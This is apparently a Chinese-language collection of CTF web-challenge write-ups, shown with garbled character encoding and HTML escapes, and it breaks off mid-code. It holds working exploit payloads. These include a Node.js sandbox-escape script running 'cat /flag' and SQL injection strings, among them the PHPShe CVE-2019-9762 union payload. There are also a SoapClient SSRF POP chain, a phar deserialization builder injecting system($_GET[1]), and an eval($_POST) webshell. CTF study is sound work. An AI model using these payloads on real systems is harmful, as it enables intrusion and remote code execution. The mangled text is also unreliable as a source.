ä½†æ˜¯å‰é¢ä¼šå…ˆè¿‡ä¸€å±‚è¿™ä¸ª\nif (!utils.checkBucket(bucket)) { return res.render(\u0026#39;user\u0026#39;, { user, error: \u0026#34;Invalid bucket url.\u0026#34; }); } // utils.js static checkBucket(url) { try { url = new URL(url); } catch (err) { return false; } if (url.protocol != \u0026#34;http:\u0026#34; \u0026amp;\u0026amp; url.protocol != \u0026#34;https:\u0026#34;) return false; if (url.href.includes(\u0026#39;oss-cn-beijing.ichunqiu.com\u0026#39;) === false) return false; return true; } è¿™ä¸ªå¾ˆå¥½ç»•ï¼Œä¸å½±å“åé¢çš„ï¼›æ¥ä¸‹æ¥å°±æ˜¯æ„é€ evil.htmläº†ï¼Œåˆ©ç”¨crawler.jsæ‰€ç”¨zombieåº“çš„æ¼æ´ï¼Œå…·ä½“æ¼æ´åˆ†æå‚è§-\u0026gt;Nodejs Zoombie Package RCE åˆ†æ\n// crawler.js goto(url) { return new Promise((resolve, reject) =\u0026gt; { try { this.crawler.visit(url, () =\u0026gt; { const resource = this.crawler.resources.length ? this.crawler.resources.filter(resource =\u0026gt; resource.response).shift() : null; this.statusCode = resource.response.status this.headers = this.getHeaders(); this.cookies = this.getCookies(); this.htmlContent = this.getHtmlContent(); resolve(); }); } catch (err) { reject(err.message); } }) } payloadå¦‚ä¸‹\nbucket url\nhttp://101.35.114.107:2301/craw.html?oss-cn-beijing.ichunqiu.com/ craw.html\n\u0026lt;script\u0026gt; a=this.constructor.constructor.constructor.constructor(\u0026#39;return process\u0026#39;)();b=a.mainModule.require(\u0026#39;child_process\u0026#39;);c=b.execSync(\u0026#39;cat /flag\u0026#39;).toString();document.write(c); \u0026lt;/script\u0026gt; flag{bdb5a23f-1436-4b83-9ad9-0a889d34b1f4}\n[SWPU2019]Web6 ä¸€ä¸ªç™»å½•é¡µé¢\nè¿™sqlè¯­å¥éƒ½å†™è„¸ä¸Šäº†ï¼Œä½†æ˜¯åŸè°…æˆ‘è€èœé¸¡ï¼Œè‡ªå·±æ²¡è¯•å‡ºæ¥\nusername=1\u0026#39;or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; group by passwd with rollup having passwd is NULL#\u0026amp;passwd= ä¹‹å‰çœŸæ²¡è§è¿‡è¿™ç§æ³¨å…¥æ–¹å¼â€¦â€¦ æŸ¥äº†wpåçŸ¥é“è¿™æ˜¯å®éªŒå§3.å› ç¼ºæ€æ±€çš„ç»•è¿‡ï¼Œé‚£é“é¢˜çš„æºç å¦‚ä¸‹\n\u0026lt;?php error_reporting(0); if (!isset($_POST[\u0026#39;uname\u0026#39;]) || !isset($_POST[\u0026#39;pwd\u0026#39;])) { // ä¸¤ä¸ªå‚æ•° echo \u0026#39;\u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt;\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;input name=\u0026#34;uname\u0026#34; type=\u0026#34;text\u0026#34;/\u0026gt;\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;input name=\u0026#34;pwd\u0026#34; type=\u0026#34;text\u0026#34;/\u0026gt;\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;input type=\u0026#34;submit\u0026#34; /\u0026gt;\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;/form\u0026gt;\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;!--source: source.txt--\u0026gt;\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; die; } function AttackFilter($StrKey,$StrValue,$ArrReq){ if (is_array($StrValue)){ $StrValue=implode($StrValue); } if (preg_match(\u0026#34;/\u0026#34;.$ArrReq.\u0026#34;/is\u0026#34;,$StrValue)==1){ print \u0026#34;æ°´å¯è½½èˆŸï¼Œäº¦å¯èµ›è‰‡ï¼\u0026#34;; exit(); } } $filter = \u0026#34;and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)\u0026#34;; foreach($_POST as $key=\u0026gt;$value){ AttackFilter($key,$value,$filter); // è¿‡æ»¤å­—ç¬¦ } $con = mysql_connect(\u0026#34;XXXXXX\u0026#34;,\u0026#34;XXXXXX\u0026#34;,\u0026#34;XXXXXX\u0026#34;); if (!$con){ die(\u0026#39;Could not connect: \u0026#39; . mysql_error()); } $db=\u0026#34;XXXXXX\u0026#34;; mysql_select_db($db, $con); $sql=\u0026#34;SELECT * FROM interest WHERE uname = \u0026#39;{$_POST[\u0026#39;uname\u0026#39;]}\u0026#39;\u0026#34;; // unameå¯æ§ $query = mysql_query($sql); if (mysql_num_rows($query) == 1) { // å¦‚æœåªæŸ¥å‡ºæ¥ä¸€è¡Œæ•°æ® $key = mysql_fetch_array($query); if($key[\u0026#39;pwd\u0026#39;] == $_POST[\u0026#39;pwd\u0026#39;]) { // æ¯”å¯¹passwd print \u0026#34;CTF{XXXXXX}\u0026#34;; }else{ print \u0026#34;äº¦å¯èµ›è‰‡ï¼\u0026#34;; } }else{ // æ•°æ®å¤šäºä¸€è¡Œ print \u0026#34;ä¸€é¢—èµ›è‰‡ï¼\u0026#34;; } mysql_close($con); ?\u0026gt; åˆ†æå†™è¿›å»äº†ï¼Œå®ƒæœ‰ä¸€ä¸ªæ•°æ®æ˜¯å¦ä¸º1è¡Œçš„åˆ¤æ–­ï¼Œè¯´æ˜ç”¨æˆ·ä¸æ­¢ä¸€ä¸ªï¼Œæˆ‘ä»¬å¯ä»¥ç”¨limit 1 offset xæ¥åˆ¤æ–­äººæ•°ï¼›ç¬¬ä¸‰ä¸ªè¿‡æ»¤éœ€è¦è¾“å…¥çš„å¯†ç å’Œæ•°æ®åº“ä¸­çš„ç›¸åŒï¼Œå¯ä»¥ä½¿ç”¨group by pwd with rollupè¯­å¥ï¼Œåˆ†ç»„åä¼šå¤šä¸€è¡Œç»Ÿè®¡ï¼Œåœ¨groupåˆ†ç»„å­—æ®µçš„åŸºç¡€ä¸Šå†ç»Ÿè®¡æ•°æ®ï¼Œä¼šå‡ºç°è¿™æ ·çš„æ•ˆæœ\nä¼šå‡ºç°ä¸€ä¸ªNULLï¼ˆæœ€åçš„æ€»æ•°æ®è¿˜ä¼šå¤šä¸€ä¸ªNULLï¼‰ï¼Œæ„Ÿè§‰å¾ˆç±»ä¼¼è”åˆæŸ¥è¯¢çš„æ—¶å€™å‡­ç©ºå¤šä¸€ç»„æ•°æ®ï¼›æˆ‘ä»¬å°±éœ€è¦è¿™ä¸ªpass=nullçš„æ•°æ®ï¼Œç”¨having passwd is NULLï¼›ä»¥ä¸‹æ˜¯æœ¬é¢˜çš„payload\n1\u0026#39;or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; group by passwd with rollup having passwd is NULL# ç©ºå¯†ç å³å¯æˆåŠŸç™»å…¥\næ‰«ç›®å½•æœ‰ä¸€ä¸ªwsdl.phpï¼Œçœ‹åˆ°äº†ç†Ÿæ‚‰çš„SoapClientï¼Œè¿˜æç¤ºäº†è¿™äº›\nService.phpå’ŒInterface.phpéƒ½è¯»ä¸åˆ°ï¼Œé‚£åªèƒ½è¯»å‰©ä¸‹çš„ä¸€äº›methodäº†ï¼Œæ¥åœ¨/index.php?method=åé¢çœ‹çœ‹\nè¿˜æœ‰/index.php?method=get_flag\nå†ç»“åˆä¸Šé¢çš„SoapClientï¼Œè‚¯å®šæ˜¯è¦ååºåˆ—åŒ–SoapClient+SSRFäº†\nè¿˜æœ‰/index.php?method=File_readï¼Œå¯ä»¥æ¥ä¸€ä¸ªPOSTå‚æ•°filenameï¼Œæˆ‘ä»¬è¯»ä¸€ä¸‹æºç \nindex.php\n\u0026lt;?php ob_start(); include (\u0026#34;encode.php\u0026#34;); include(\u0026#34;Service.php\u0026#34;); //error_reporting(0); //phpinfo(); $method = $_GET[\u0026#39;method\u0026#39;]?$_GET[\u0026#39;method\u0026#39;]:\u0026#39;index\u0026#39;; //echo 1231; $allow_method = array(\u0026#34;File_read\u0026#34;,\u0026#34;login\u0026#34;,\u0026#34;index\u0026#34;,\u0026#34;hint\u0026#34;,\u0026#34;user\u0026#34;,\u0026#34;get_flag\u0026#34;); if(!in_array($method,$allow_method)) { die(\u0026#34;not allow method\u0026#34;); } if($method===\u0026#34;File_read\u0026#34;) { $param =$_POST[\u0026#39;filename\u0026#39;]; $param2=null; }else { if($method===\u0026#34;login\u0026#34;) { $param=$_POST[\u0026#39;username\u0026#39;]; $param2 = $_POST[\u0026#39;passwd\u0026#39;]; }else { echo \u0026#34;method can use\u0026#34;; } } echo $method; $newclass = new Service(); echo $newclass-\u0026gt;$method($param,$param2); ob_flush(); ?\u0026gt; è¯»ä¸€ä¸‹Service.phpæ²¡æƒé™ï¼Œè¯»encode.php\n\u0026lt;?php function en_crypt($content,$key){ $key = md5($key); $h = 0; $length = strlen($content); $swpuctf = strlen($key); $varch = \u0026#39;\u0026#39;; for ($j = 0; $j \u0026lt; $length; $j++) { if ($h == $swpuctf) { $h = 0; } $varch .= $key{$h}; $h++; } $swpu = \u0026#39;\u0026#39;; for ($j = 0; $j \u0026lt; $length; $j++) { $swpu .= chr(ord($content{$j}) + (ord($varch{$j})) % 256); } return base64_encode($swpu); } æœ‰ä¸ªKeyï¼Œæˆ‘ä»¬è¯»keyaaaaaaaasdfsaf.txtå¾—åˆ°flag{this_is_false_flag}ï¼Œåº”è¯¥è¿™ä¸ªå°±æ˜¯keyï¼›æä¸€ä¸ªå¯¹åº”çš„è§£å¯†è„šæœ¬\n\u0026lt;?php function de_crypt($swpu,$key){ $swpu=base64_decode($swpu); $key=md5($key); $h=0; $length=strlen($swpu); $swpuctf=strlen($key); $varch=\u0026#39;\u0026#39;; for($j=0;$j\u0026lt;$length;$j++){ if($h==$swpuctf) { $h=0; } $varch.=$key{$h}; $h++; } $content=\u0026#39;\u0026#39;; for($j=0;$j\u0026lt;$length;$j++) { $content.= chr(ord($swpu{$j}) - (ord($varch{$j}))+256 % 256); } return $content; } æ³¨æ„åˆ°æˆ‘ä»¬è®¿é—®çš„æ—¶å€™cookieä¼šæœ‰ä¸€ä¸ªuserå­—æ®µ\nç”¨ä¸Šé¢é‚£ä¸ªè§£å¯†è„šæœ¬è¿›è¡Œè§£å¯†\nprint (de_crypt(\u0026#34;3J6Roahxag==\u0026#34;, \u0026#34;flag{this_is_false_flag}\u0026#34;)); // xiaoC:2 æˆ‘ä»¬ä¼ªé€ ä¸€ä¸ªadmin:1é‡æ–°åŠ å¯†å›å»ï¼Œå¾—åˆ°xZmdm9NxaQ==ï¼Œç”¨File_readè¯»ä¸€ä¸‹å‰é¢æåˆ°çš„se.phpï¼Œå¥½å®¶ä¼™ï¼Œæœç„¶ååºåˆ—åŒ–ï¼Œè€Œä¸”æ˜¯ç»“åˆäº†SoapClientå’Œsession\n\u0026lt;?php ini_set(\u0026#39;session.serialize_handler\u0026#39;, \u0026#39;php\u0026#39;); class aa { public $mod1; public $mod2; // $cc public function __call($name,$param) { if($this-\u0026gt;{$name}) { $s1 = $this-\u0026gt;{$name}; $s1(); // $cc-\u0026gt;__invoke } } public function __get($ke) { return $this-\u0026gt;mod2[$ke]; } } class bb { public $mod1; // $aa public $mod2; public function __destruct() { $this-\u0026gt;mod1-\u0026gt;test2(); // $aa-\u0026gt;__call } } class cc { public $mod1; // $ee public $mod2; public $mod3; public function __invoke() { $this-\u0026gt;mod2 = $this-\u0026gt;mod3.$this-\u0026gt;mod1; // $ee-\u0026gt;__toString } } class dd { public $name; public $flag; public $b; // public function getflag() { session_start(); var_dump($_SESSION); $a = array(reset($_SESSION),$this-\u0026gt;flag);\t// æ³¨æ„è¿™é‡Œçš„session echo call_user_func($this-\u0026gt;b,$a); } } class ee { public $str1; // $dd public $str2; // \u0026#39;getflag\u0026#39; public function __toString() { $this-\u0026gt;str1-\u0026gt;{$this-\u0026gt;str2}(); // $dd-\u0026gt;getflag return \u0026#34;1\u0026#34;; } } $bb = new bb(); $aa = new aa(); $cc = new cc(); $ee = new ee(); $bb -\u0026gt;mod1 = $aa; $cc -\u0026gt; mod1 = $ee; $dd = new dd(); $dd-\u0026gt;flag=\u0026#39;Get_flag\u0026#39;; $dd-\u0026gt;b=\u0026#39;call_user_func\u0026#39;; $ee -\u0026gt; str1 = $dd; $ee -\u0026gt; str2 = \u0026#34;getflag\u0026#34;; $aa -\u0026gt;mod2[\u0026#39;test2\u0026#39;] = $cc; echo serialize($bb); interface.php\n\u0026lt;?php include(\u0026#39;Service.php\u0026#39;); $ser = new SoapServer(\u0026#39;Service.wsdl\u0026#39;,array(\u0026#39;soap_version\u0026#39;=\u0026gt;SOAP_1_2)); $ser-\u0026gt;setClass(\u0026#39;Service\u0026#39;); $ser-\u0026gt;handle(); ?\u0026gt; æ•´ä½“çš„æ€è·¯å¤§æ¦‚æ˜¯ï¼Œé€šè¿‡æ–‡ä»¶ä¸Šä¼ æŠŠä¸€ä¸ªæˆ‘ä»¬æ„é€ å¥½çš„æ¶æ„SoapClientçš„åºåˆ—åŒ–å­—ç¬¦ä¸²å†™å…¥sess_2333è¿™ä¸ªsessionæ–‡ä»¶ä¸­ï¼Œç„¶ååˆ©ç”¨se.phpçš„ååºåˆ—åŒ–åŠŸèƒ½ï¼Œè°ƒç”¨åˆ°call_user_funcçš„æ—¶å€™å°±ä¼šæŠŠsessionä¸­çš„SOAPç±»çš„Get_flagç»™è°ƒç”¨å‡ºæ¥ï¼Œcall_user_func('call_user_func', array($session, 'Get_flag'));\nâ€”â€”â€”â€”â€”â€”ä½†æ˜¯è¿™é‡Œå°±æœ‰ä¸ªé—®é¢˜ï¼Œæ€ä¹ˆèƒ½ç¡®å®šæˆ‘ä»¬ssrfæ‰“çš„interface.phpå°±æœ‰Get_flagæ–¹æ³•å‘¢ï¼Ÿä¸ºä»€ä¹ˆä¸æ‰“ssrfçš„/index.php?method=get_flagå‘¢ï¼Ÿå‡ºé¢˜äººè¯´é‚£ä¸ªä¸è¾“å‡ºç»“æœï¼Œå¤šåšäº†ä¸ªsoapæ¥å£interface.phpæ¥æ”»å‡»\né¦–å…ˆæ˜¯è¿™ä¸ªSoapClient\n\u0026lt;?php $target = \u0026#39;http://127.0.0.1/interface.php\u0026#39;; $headers = array( \u0026#39;X-Forwarded-For: 127.0.0.1\u0026#39;, \u0026#39;Cookie: user=xZmdm9NxaQ==\u0026#39;, ); $b = new SoapClient(null,array(\u0026#39;location\u0026#39; =\u0026gt; $target,\u0026#39;user_agent\u0026#39;=\u0026gt;\u0026#39;amiz^^Content-Type: application/x-www-form-urlencoded^^\u0026#39;.join(\u0026#39;^^\u0026#39;,$headers),\u0026#39;uri\u0026#39; =\u0026gt; \u0026#34;amiz\u0026#34;)); $a = serialize($b); $a = str_replace(\u0026#39;^^\u0026#39;,\u0026#34;\\r\\n\u0026#34;,$a); echo $a; ?\u0026gt; // O:10:\u0026#34;SoapClient\u0026#34;:5:{s:3:\u0026#34;uri\u0026#34;;s:4:\u0026#34;amiz\u0026#34;;s:8:\u0026#34;location\u0026#34;;s:30:\u0026#34;http://127.0.0.1/interface.php\u0026#34;;s:15:\u0026#34;_stream_context\u0026#34;;i:0;s:11:\u0026#34;_user_agent\u0026#34;;s:108:\u0026#34;amiz Content-Type: application/x-www-form-urlencoded X-Forwarded-For: 127.0.0.1 Cookie: user=xZmdm9NxaQ==\u0026#34;;s:13:\u0026#34;_soap_version\u0026#34;;i:1;} ä¼ ä¸Šå»ï¼Œè®°å¾—æ”¹PHPSESSID\nç„¶ååˆ°/se.phpï¼ŒPOSTæ–¹å¼ä¼ å…¥aa=popé“¾ç»“æœ\nå‚è€ƒï¼šwp | wp2\n[Insomni hack teaser 2019]Phuck2 \u0026lt;?php stream_wrapper_unregister(\u0026#39;php\u0026#39;); // ä¸å¤ªæ‡‚ï¼Ÿ if(isset($_GET[\u0026#39;hl\u0026#39;])) highlight_file(__FILE__); $mkdir = function($dir) { system(\u0026#39;mkdir -- \u0026#39;.escapeshellarg($dir)); // å®šä¹‰å‡½æ•°$mkdir() è°ƒç”¨ç³»ç»Ÿå‡½æ•°mkdir }; $randFolder = bin2hex(random_bytes(16)); // éšæœºå­—ç¬¦ä¸² $mkdir(\u0026#39;users/\u0026#39;.$randFolder); // å½“å‰ç›®å½•ä¸‹åˆ›å»ºå­ç›®å½•users/randFolder chdir(\u0026#39;users/\u0026#39;.$randFolder); $userFolder = (isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]) ? $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;] : $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); // å¯ä»¥è‡ªå®šä¹‰å­˜å‚¨è·¯å¾„ $userFolder = basename(str_replace([\u0026#39;.\u0026#39;,\u0026#39;-\u0026#39;],[\u0026#39;\u0026#39;,\u0026#39;\u0026#39;],$userFolder)); // æ›¿æ¢`.`å’Œ`-` $mkdir($userFolder); // åˆ›å»ºå­ç›®å½•å¹¶è½¬åˆ°å­ç›®å½•ä¸­ chdir($userFolder); file_put_contents(\u0026#39;profile\u0026#39;,print_r($_SERVER,true)); // å†™å…¥å†…å®¹ æ–‡ä»¶åä¸ºprofile chdir(\u0026#39;..\u0026#39;); // å›åˆ°users/randFolder $_GET[\u0026#39;page\u0026#39;]=str_replace(\u0026#39;.\u0026#39;,\u0026#39;\u0026#39;,$_GET[\u0026#39;page\u0026#39;]); // è¿‡æ»¤`.` if(!stripos(file_get_contents($_GET[\u0026#39;page\u0026#39;]),\u0026#39;\u0026lt;?\u0026#39;) \u0026amp;\u0026amp; !stripos(file_get_contents($_GET[\u0026#39;page\u0026#39;]),\u0026#39;php\u0026#39;)) {\t// æ–‡ä»¶å†…å®¹ä¸èƒ½æœ‰\u0026lt;?å’Œphp include($_GET[\u0026#39;page\u0026#39;]); // æ–‡ä»¶åŒ…å«ç‚¹ } chdir(__DIR__); // å›åˆ°å½“å‰ç›®å½• system(\u0026#39;rm -rf users/\u0026#39;.$randFolder); // åˆ é™¤users/randFolderåŠå…¶å­ç›®å½• ?\u0026gt; è‡ªå·±ç¬¬ä¸€éçœ‹çš„æ—¶å€™æ²¡æ˜ç™½ç¬¬ä¸€å¥å•¥æ„æ€ï¼ŒåŸæ¥ç¬¬ä¸€å¥çš„æ„æ€æ˜¯banäº†phpæµï¼Œç¡®å®æŒºç‹ çš„ï¼›äº®ç‚¹æœ‰å‡ ä¸ªï¼Œé¦–å…ˆæ˜¯è°ƒç”¨ç³»ç»Ÿçº§çš„mkdirå’Œrmå‘½ä»¤ï¼Œå°±éå¸¸æœ‰å¯ä»¥ç»•è¿‡çš„ç©ºé—´ï¼ˆä½†æœ€åè€ƒçš„åœ°æ–¹ä¹Ÿä¸åœ¨è¿™ï¼‰ï¼Œå¦å¤–é‚£ä¸ªfile_put_contentsæ–‡ä»¶çš„å†…å®¹æˆ‘ä»¬å¯æ§ï¼Œå› ä¸ºæ˜¯æ•´ä¸ª$_SERVERæ•°ç»„ï¼ˆå¯ä»¥æŠŠæˆ‘ä»¬çš„ä»£ç å†™åˆ°ä»»æ„httpè¯·æ±‚å¤´ä¸­ï¼‰ï¼Œè¿˜æœ‰åé¢çš„includeæ–‡ä»¶åŒ…å«ç‚¹ä¸å…è®¸å†…å®¹æœ‰\u0026lt;?å’Œphpï¼ˆéœ€è¦ç»•è¿‡è¿™ä¸ªæ£€æµ‹ï¼‰ï¼›æ®è¯´åé¢æœ‰phpinfo.phpçš„æç¤ºè¯´allow_url_fopen=On allow_url_include=Off\nè¿™é‡Œåˆ©ç”¨çš„ç‚¹æ˜¯includeä¸file_get_contentsåœ¨å¤„ç†Data URIä¸Šçš„é—®é¢˜ã€‚ä»–ä»¬éƒ½æ”¯æŒdata:text/vnd-example+xyz;foo=bar;base64,R0lGODdhè¿™æ ·çš„å†…å®¹ï¼ˆè€Œä¸æ˜¯data://æµï¼ï¼‰ï¼Œè¿˜æ¯”å¦‚data:image/jpeg;base64,xxxè¿™æ ·çš„å›¾ç‰‡ç­‰ç­‰ï¼Œä½†æ˜¯æœ‰ä¸€äº›é—®é¢˜ï¼Œfile_get_contentså…è®¸ä½¿ç”¨data URIï¼Œä¼šç›´æ¥è¿”å›åé¢çš„å†…å®¹ï¼Œå½“allow_url_include=Offæƒ…å†µä¸‹ä¸å…è®¸include data URIï¼Œä½†å¦‚æœå½“data:,xxxæ˜¯ä¸€ä¸ªç›®å½•åçš„è¯å°±ä¼šæ”¾å¼€è¿™ä¸ªé™åˆ¶ï¼ˆè¿”å›xxx è€Œä¸æ˜¯æ–‡ä»¶å†…å®¹ï¼‰\nåªè¦æŠŠxffå¤´æ”¹ä¸ºæˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶åï¼Œç„¶åéšä¾¿ä¸€ä¸ªå‚æ•°åŒ…å«æˆ‘ä»¬çš„æ¶æ„ä»£ç ï¼ˆåœ¨$_SERVERSæ•°ç»„ä¸­ï¼‰ï¼Œå†è®©pageå‚æ•°è®¾ä¸ºdata:amiz/profileï¼Œåšåˆ°file_get_contentsä¸è®¤ ä½†æ˜¯includeè®¤ï¼Œå¯ä»¥è®©å®ƒç›´æ¥åŒ…å«è¿™ä¸ªæ–‡ä»¶\nå‚è€ƒï¼šwp\n[ç½‘é¼æ¯ 2020 æ€»å†³èµ›]Game Exp ç»™äº†æºç ï¼Œéå¸¸å¤šï¼Œç»“åˆé¡µé¢åŠŸèƒ½çœ‹ä»£ç ï¼›é¦–å…ˆæ˜¯æ³¨å†Œï¼Œæœ‰ä¸ªå¾ˆå¥‡æ€ªçš„å•ç‹¬çš„ç±»\nå¾ˆæ˜¾ç„¶éœ€è¦ä¸€ä¸ªååºåˆ—åŒ–ç‚¹è§¦å‘AnyClassçš„eval()ï¼Œç»“åˆæ³¨å†Œåœ°æ–¹ä¸Šä¼ æ–‡ä»¶çš„åœ°æ–¹+file_existså‡½æ•°ï¼Œå¾ˆæ˜¾ç„¶æ˜¯pharååºåˆ—åŒ–äº†ï¼Œè€Œpharæœ¬æ¥å°±å¯¹åç¼€åä¸æ•æ„Ÿï¼ˆä¸»è¦çœ‹å†…å®¹ï¼‰ï¼Œæ‰€ä»¥ç›´æ¥ç”¨phar.jpgå³å¯ï¼Œ$filenameæ˜¯æ‹¼æ¥çš„ç”¨æˆ·åå’Œåç¼€\nexp.php\n\u0026lt;?php class AnyClass{ var $output = \u0026#39;echo \u0026#34;ok\u0026#34;;\u0026#39;; function __destruct() { eval($this -\u0026gt; output); } } $c = new AnyClass(); $c -\u0026gt; output = \u0026#39;system($_GET[1]);\u0026#39;;\t// æ³¨æ„è¿™é‡Œæ˜¯å•å¼•å· echo serialize($c); $phar = new Phar(\u0026#34;exp.phar\u0026#34;); $phar -\u0026gt; startBuffering(); $phar -\u0026gt; setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#39;); $phar -\u0026gt; setMetadata($c); $phar -\u0026gt; addFromString(\u0026#39;test.txt\u0026#39;,\u0026#39;test\u0026#39;); $phar -\u0026gt; stopBuffering(); ä¿®æ”¹åç¼€å’ŒMIMEä¸Šä¼ ï¼Œè·¯å¾„æ˜¯/login/amiz.jpgï¼ˆæ˜¯ç”¨æˆ·å\nå†å›åˆ°æ³¨å†Œä¸Šä¼ é‚£é‡Œï¼Œä¿®æ”¹ç”¨æˆ·åä¸ºphp://amizï¼Œç„¶åGETå‚æ•°è§¦å‘shellå³å¯\n[RoarCTF 2019]PHPShe é™„ä»¶é‡Œæœ‰.ideaï¼Œç»™äº†ä¸€äº›æç¤ºï¼Œæ˜¯1.7ç‰ˆæœ¬çš„phpsheï¼Œæœ‰ä¸¤ä¸ªå·²çŸ¥çš„cveï¼Œä¸è¿‡xxeé‚£ä¸ªå› ä¸ºä¸å­˜åœ¨å¯¹åº”çš„phpæ–‡ä»¶ï¼Œæ‰€ä»¥ç”¨sqlé‚£ä¸ªcve-2019-9762ï¼Œä¸‹é¢è·Ÿä¸€ä¸‹åˆ†æçš„è¿‡ç¨‹\nåœ¨include/function/global.func.phpä¸‹æœ‰é’ˆå¯¹æ•°æ®åº“å®‰å…¨çš„å‡½æ•°pe_dbhold()\nå‚æ•°ä¼šè¢«addslasheså¤„ç†ï¼Œæˆ‘ä»¬çš„å¼•å·å’Œåæ–œæ ä¸ä¿ï¼Œé‚£çœ‹çœ‹æœ‰æ²¡æœ‰ä¸ç”¨å¼•å·ä¹Ÿå¯ä»¥æ³¨å…¥çš„åœ°æ–¹æˆ–è€…æ˜¯å®½å­—èŠ‚æ³¨å…¥\nåœ¨include/plugin/payment/alipay/pay.phpä¸­å¯¹$order_idå‚æ•°è¿›è¡Œäº†è¿™æ ·çš„å¤„ç†\nå…¶ä¸­å¥‡å¥‡æ€ªæ€ªçš„$_g_idæ˜¯å¯¹postå‚æ•°çš„é‡å‘½åï¼Œåœ¨common.phpä¸­\nç”¨åˆ°äº†extractå¯¹å˜é‡åå‰é¢åŠ ä¸Š_g_æˆ–_p_çš„å‰ç¼€\nå›åˆ°ä¸Šé¢ï¼Œgetæ–¹å¼ä¼ å…¥çš„idå‚æ•°å…ˆç»è¿‡pe_dbholdå¤„ç†åèµ‹å€¼ç»™$order_idï¼Œéšåè¿›å…¥order_tableå‡½æ•°ï¼Œä½äºhook/order.hook.php\nå¦‚æœä¼ å…¥çš„å‚æ•°å«æœ‰_ï¼Œåˆ™ä¼šä»¥å®ƒä¸ºåˆ†éš”ç¬¦ï¼Œè¿”å›order_+_å‰çš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œå¦‚æœå‚æ•°ä¸å«_ç›´æ¥è¿”å›order\nå†å›åˆ°å‰é¢çš„pe_selectï¼Œä½äºinclude/class/db.class.php\nè¿™ä¸å·§äº†ï¼Œå‚æ•°éƒ¨åˆ†ç”¨çš„æ˜¯åå¼•å·è€Œä¸æ˜¯å•å¼•å·ï¼Œä¼ å…¥çš„$order_idå°±æ˜¯è¿™é‡Œçš„$tableéƒ¨åˆ†ï¼Œdbpreæ˜¯æ•°æ®åº“è¡¨å‰ç¼€ï¼›æ„é€ è¿™æ ·çš„payload\npay` where 1=1 and sleep(5)%23_ ç»è¿‡order_tableå’Œpe_selectä¹‹åæ˜¯è¿™æ ·çš„è¯­å¥\nselect * from `order_pay` where 1=1 and sleep(5)#` where `order_id` = `pay` where 1=1 and sleep(5)#_ limit 1 ç„¶åæ‰¾åˆ©ç”¨ç‚¹ï¼Œåœ¨include/plugin/payment/alipay/pay.phpä¸­æœ‰åˆ©ç”¨ç‚¹å¹¶ä¸”æœ‰å›æ˜¾ä½ï¼›å› ä¸ºå¯¹_çš„ç‰¹æ®Šå¤„ç†ï¼Œæˆ‘ä»¬æ— æ³•ç”¨information_schemaæ¥æŸ¥è¡¨ï¼Œæ‰€ä»¥åªèƒ½åœ¨ä¸çŸ¥é“åˆ—åçš„æƒ…å†µä¸‹æ³¨å…¥\nselect`3`from(select 1,2,3,4,5,6 union select * from admin)a limit 1,1 æ„é€ payload\nGET /include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,((select`3`from(select%201,2,3,4,5,6%20union%20select%20*%20from%20admin)a%20limit%201,1)),4,5,6,7,8,9,10,11,12%23_ å¾—åˆ°adminå¯†ç çš„md5å€¼ï¼ŒæŸ¥ä¸€ä¸‹å¾—åˆ°altman777ï¼Œåœ¨/admin.phpå¤„ç™»å…¥åå°\né¦–å…ˆåœ¨å“ç‰Œç®¡ç†å¤„å¯ä»¥ä¸Šä¼ æ–‡ä»¶\nå€ŸåŠ©.ideaç»™å‡ºçš„æç¤ºï¼Œåœ¨include/class/pclzip.class.phpæœ‰ä¸ªæ¯”å®˜æ–¹æ–‡ä»¶å¤šå‡ºæ¥çš„__destruct\nè¿˜æœ‰è‡ªå¸¦çš„__construct\nè¿˜æœ‰ä¸ªæ‰“å¼€çš„module/admin/moban.phpå’Œinclude/function/global.func.phpï¼Œåœ¨downæ“ä½œä¸­å®ä¾‹åŒ–ä¸Šé¢çš„PclZipç±»ï¼Œä¹‹åç”¨extract()æ¥è§£å‹zipæ–‡ä»¶ï¼Œ$moban_templateæ˜¯æ–‡ä»¶è·¯å¾„\nåœ¨delæ“ä½œä¸­è°ƒç”¨pe_dirdel\næœ‰ä¸ªis_file($dir_path)å¯ä»¥è§¦å‘ååºåˆ—åŒ–\nç»“åˆä¸Šé¢çš„__destructä¸­çš„extractï¼Œè‚¯å®šæ˜¯pharååºåˆ—åŒ–äº†ï¼Œåœ¨å‰é¢ä¸Šä¼ çš„åœ°æ–¹ä¸Šä¼ å‹ç¼©è¿‡çš„webshellï¼Œç„¶åå†ä¼ å…¥pharï¼Œé‡Œé¢å‚æ•°çš„è·¯å¾„æŒ‡å‘å‰é¢çš„zipè·¯å¾„ï¼Œè¢«ååºåˆ—åŒ–åè§¦å‘__destruct è§£å‹zipåˆ°ä¸€ä¸ªå¯è¯»å†™ç›®å½•/var/www/html/dataä¸­\n\u0026lt;?php eval($_POST[\u0026#39;amiz\u0026#39;]);?\u0026gt; http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/data/attachment/brand/1.zip\n\u0026lt;?php class PclZip{ var $zipname = \u0026#39;\u0026#39;; var $zip_fd = 0; var $error_code = 1; var $error_string = \u0026#39;\u0026#39;; var $magic_quotes_status; var $save_path = \u0026#39;/var/www/html/data\u0026#39;;//è§£å‹ç›®å½• function __construct($p_zipname){ $this-\u0026gt;zipname = $p_zipname; $this-\u0026gt;zip_fd = 0; 